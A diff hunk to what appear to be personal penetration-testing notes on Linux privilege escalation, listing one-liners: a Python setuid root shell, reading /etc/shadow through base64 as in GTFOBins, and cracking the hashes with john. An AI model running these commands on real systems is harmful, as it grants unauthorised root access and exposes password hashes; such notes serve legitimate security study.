@@ -6,6 +6,7 @@ sudo su
 
 **One liners**
 ```'python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'```
+
 ```base64 /etc/shadow | base64 --decode```
 
 A lot of priviledge escalation is actually in ```https://gtfobins.org/``` for example using ```base64 /etc/shadow | base64 --decode``` to find password hashes. (john --wordlist=PASSWORDLIST HASH) to decrypt 
